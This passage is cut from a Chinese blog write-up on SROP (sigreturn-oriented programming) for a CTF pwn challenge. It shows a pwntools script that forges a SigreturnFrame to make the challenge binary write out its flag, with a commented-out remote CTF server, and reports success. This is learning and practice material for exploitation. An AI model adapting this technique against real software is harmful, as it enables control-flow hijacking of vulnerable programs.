</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./funsignals_player_bin&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./funsignals_player_bin&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># io = remote(&#39;hack.bckdr.in&#39;, 9034)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Creating a custom frame</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rax</span> <span class=o>=</span> <span class=n>constants</span><span class=o>.</span><span class=n>SYS_write</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>constants</span><span class=o>.</span><span class=n>STDOUT_FILENO</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;flag&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;syscall&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>frame</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>成功将 flag 输出。
<img loading=lazy src=https://gitee.com/juhuahua/chart-bed/raw/master/20230504224423.png alt=image.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://juhuax.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/>PWN知识点</a></li></ul><nav class=paginav><a class=prev href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/sfuzz-slice-based-fuzzing-for-real-time-operating-systems/><span class=title>« Prev</span><br><span>SFuzz Slice-based Fuzzing for Real-Time Operating Systems</span></a>
<a class=next href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing/><span class=title>Next »</span><br><span>The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share SROP on twitter" href="https://twitter.com/intent/tweet/?text=SROP&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f&amp;hashtags=PWN%e7%9f%a5%e8%af%86%e7%82%b9"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SROP on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f&amp;title=SROP&amp;summary=SROP&amp;source=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SROP on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f&title=SROP"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SROP on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SROP on whatsapp" href="https://api.whatsapp.com/send?text=SROP%20-%20https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SROP on telegram" href="https://telegram.me/share/url?text=SROP&amp;url=https%3a%2f%2fjuhuax.github.io%2fposts%2f1.%25E5%25AD%25A6%25E4%25B9%25A0%2f2.%25E5%2588%25B7%25E9%25A2%2598%2fctf%2fpwn%2fsrop%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://juhuax.github.io/>BLOG</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>